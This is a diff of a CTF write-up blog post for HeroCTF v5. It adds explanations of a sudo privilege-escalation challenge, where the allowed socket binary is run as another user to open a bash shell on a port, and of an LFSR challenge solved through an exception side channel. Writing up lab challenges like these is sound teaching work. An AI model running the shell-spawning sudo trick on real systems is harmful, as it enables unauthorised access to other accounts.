@@ -1,12 +1,12 @@
 ---
 title: "HeroCTF v5"
 date: 2023-05-14T08:17:41-04:00
-categories: [ctf, writeup, blockchain]
-tags: [web3, blockchain, PRNG, programming]
+categories: [ctf, writeup, blockchain, programming]
+tags: [web3, blockchain, PRNG, heap, LFSR]
 cover:
     image: 'HeroCTF_icon_500.png'
 ---
-Organized by the students of Engineering students in France, this was a nice CTF with an interesting variety of challenges. Unfortunately, I did not have much free time to play in the CTF this weekend. I was able to solve a few challenges, and came very close on a couple.
+Organized by the students of Engineering students in France, this was a nice CTF with an interesting variety of challenges. Unfortunately, I did not have much free time to play in the CTF this weekend. I was able to solve a few challenges, and came very close on a couple. While I didn't participate much, my CTF team did a great job and scored 10119 points, placing 9th in a global field of over 1600 teams
 
 <!--more-->
 ## Solves
@@ -37,6 +37,8 @@ Plugging these strings into Cyberchef to get the flag.
 #### SUDOkLu
 `This is a warmup to get you going. Your task is to read /home/privilegeduser/flag.txt. For our new commers, the title might steer you in the right direction ;). Good luck!`
 
+We are given the credentials to `user` and can connect via ssh to the server.
+
 ```bash
     % ssh user@dyn-02.heroctf.fr -p 11873
     user@sudoklu:~$ id
@@ -47,7 +49,11 @@ Plugging these strings into Cyberchef to get the flag.
     4 drwxr-x--- 1 privilegeduser privilegeduser 4096 May 12 10:35 privilegeduser
     4 drwxr-xr-x 1 root           root           4096 May 15 20:47 ..
     4 drwxr-x--- 1 user           user           4096 May 15 20:48 user
+```
 
+Upon connecting, we can see that we are `user` and do not have access to the home directory of `privilegeduser`, which contains the flag.
+
+```bash
     user@sudoklu:~$ sudo -l
     Matching Defaults entries for user on sudoklu:
         env_reset, mail_badpass,
@@ -56,12 +62,19 @@ Plugging these strings into Cyberchef to get the flag.
 
     User user may run the following commands on sudoklu:
         (privilegeduser) NOPASSWD: /usr/bin/socket
+```
 
+The challenge hints at the sudo command exploit. Looking at the sudo permissions for the current user, shows that `user` can execute `/usr/bin/socket` as the `privilegeduser` without supplying the password. Looking at the command `socket` shows that we can run a program that can accept take the input/output from the socket. 
+
+```bash
     user@sudoklu:~$ /usr/bin/socket -h
     /usr/bin/socket: invalid option -- 'h'
     Usage: socket [-bclqrvw] [-B local ip] [-p prog] {{-s|host} port | [-s] /path}
+```
 
+We will use the sudo command to run the `/usr/bin/socket` command to spawn a shell and listen on a given port. I put that task in the background.  Next, we can connect to this shell via the socket and interact. We can see that we now are operating in a shell with the identity of `privilegeduser`, and can just `cat` the flag.
 
+```bash
     user@sudoklu:~$ sudo -u privilegeduser /usr/bin/socket -p bash  5555 -s &
     [1] 48
 
@@ -78,10 +91,78 @@ Plugging these strings into Cyberchef to get the flag.
 #### Futile
 `Linear Futile Shift Register`
 
+This challenge was full of red herrings. We are given a challenge server, that runs the following program:
+
+```python
+    #!/usr/bin/env python
+    from pylfsr import LFSR
+    from functools import reduce
+    import os
+
+    flag = os.environ.get('FLAG','Hero{fake_flag}').encode()
+
+    # converts a binary list into a integer .. equivalent of int(''.join(l), 2)
+    def binl2int(l: list) -> int:
+        return reduce(lambda x,y: 2*x+y, l)
+    # Returns an instance of LFSR.
+    # The order is 8, so the initial state consists of 8 bits, chosen randomly
+    def lfsr() -> LFSR:
+        return LFSR(fpoly=[8,6,5,4], initstate='random')
+    # Runs 8 clock cycles and returns the integer values of the bits that were shifted out. This will be the initial state in the reverse order.
+    '''
+        In [4]: print(L)
+        LFSR ( x^8 + x^6 + x^5 + x^4 + 1)
+        ==================================================
+        initstate 	=	[1 0 1 0 0 0 0 0]
+        fpoly     	=	[8, 6, 5, 4]
+        conf      	=	fibonacci
+        order     	=	8
+        expectedPeriod	=	255
+        seq_bit_index	=	-1
+        count     	=	0
+        state     	=	[1 0 1 0 0 0 0 0]
+        outbit    	=	-1
+        feedbackbit	=	-1
+        seq       	=	[-1]
+        counter_start_zero	=	True
+
+        In [5]: L.runKCycle(8)
+        Out[5]: array([0, 0, 0, 0, 0, 1, 0, 1])
+    '''
+    def get_uint8() -> int:
+        return binl2int(lfsr().runKCycle(8))
+    # XOR each character value with the LFSR initial state integer, which will never be 0.
+    def mask(flag: bytes) -> str:
+        return bytearray(f ^ get_uint8() for f in flag).hex()
+
+    while True:
+        try:
+            input('Hero{' + mask(flag[5:-1]) + '}\n')
+        except Exception as e:
+            # This exception handling is the clue
+            pass
+
+```
+
+Since the LFSR generator uses random initial state, it is possible that the initial state can be all zeros. This is invalid as there is no information to generate subsequent bits. Hence the function throws an exception.  We can capitalize on this fact.
+```
+    ...
+    ...
+    raise ValueError('Invalid Initial state vector: Initial state vector can not be All Zeros')
+ValueError: Invalid Initial state vector: Initial state vector can not be All Zeros
+```
+
+So, the logic to solve this challenge is as follows:
+1. From the first response, determine the length of the flag
+1. For each character of a flag, prepare a list of all possible 8 bit values (0 to 255)
+1. For each character, if the server sends a value for the character, remove that value from the corresponding list. 
+1. Repeat the process until each position has only ONE value left. This is the value of the flag's character.
+1. Assemble and print. 
+
 ```python
     from pwn import *
     #p = remote('static-01.heroctf.fr',9001)
-    p = process(["python3","orig_chall.py"])
+    p = process(["python3","chall.py"])
     flag = p.recvline()
     flag_len = len(flag[5:-2])//2  #ignore 'Hero{' and '}\n'
     print(f"Len = {flag_len}")
@@ -211,6 +292,7 @@ The wrinkle is that it takes two 32-bit integers to generate each floating point
 * https://siunam321.github.io/ctf/HeroCTF-v5/
 * https://mxcezl.github.io/posts/write-up/ctf/heroctf-v5/
 * https://chrootcommit.github.io/tags/heroctfv5/
+* Blockchain solves using `forge`: https://github.com/m4k2/HeroCTF-V5-WU-Foundry
 
 
 
